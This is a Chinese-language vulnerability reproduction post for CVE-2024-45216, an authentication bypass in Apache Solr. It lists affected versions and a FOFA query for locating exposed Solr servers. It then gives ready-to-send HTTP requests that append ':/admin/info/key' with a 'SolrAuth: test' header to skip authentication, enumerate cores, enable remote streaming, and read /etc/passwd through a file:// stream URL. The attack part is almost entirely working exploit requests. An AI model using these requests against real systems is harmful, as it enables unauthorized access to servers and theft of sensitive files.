# Apache-Solr身份认证绕过导致任意文件读取漏洞复现(CVE-2024-45216)

**Apache Solr 身份认证绕过漏洞(CVE-2024-45216)**，该漏洞存在于Apache Solr的PKIAuthenticationPlugin中，该插件在启用Solr身份验证时默认启用。攻击者可以利用在任何Solr API URL路径末尾添加假结尾的方式，绕过身份验证访问任意路由，从而获取敏感数据或进行其他恶意操作。

## **影响版本**

5.3.0 <= Apache Solr < 8.11.4

9.0.0 <= Apache Solr < 9.7.0

## fofa

```javascript
app="APACHE-Solr"
```

## poc

利用:/admin/info/key绕过身份验证，获取core名称

```javascript
GET /solr/admin/cores:/admin/info/key?indexInfo=false&wt=json HTTP/1.1
Host: 
SolrAuth: test
```

![image-20241101193059643](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011930714.png)

修改 core 配置

```javascript
POST /solr/core名称/config:/admin/info/key HTTP/1.1
Host: 
SolrAuth: test
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
```

![image-20241101193142994](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011931058.png)

读取文件/etc/passwd

```javascript
GET /solr/core名称/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file:///etc/passwd HTTP/1.1
Host: 
SolrAuth: test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 
Connection: close
```

![image-20241101193217925](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011932008.png)